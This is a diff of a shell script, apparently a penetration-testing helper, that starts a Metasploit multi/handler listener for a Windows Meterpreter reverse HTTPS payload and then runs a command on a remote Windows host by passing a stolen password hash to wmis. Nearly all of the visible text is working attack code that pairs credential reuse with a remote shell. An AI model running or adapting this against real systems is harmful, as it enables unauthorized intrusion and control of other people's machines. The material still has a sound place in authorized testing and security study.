@@ -71,9 +71,8 @@ echo "The commandline syntax is $command"
 
 echo "Starting the multi handler"
 sleep 3
-msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E &
+msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
 
+sleep 10
 #execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command""
 /pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"
-
-fg 1
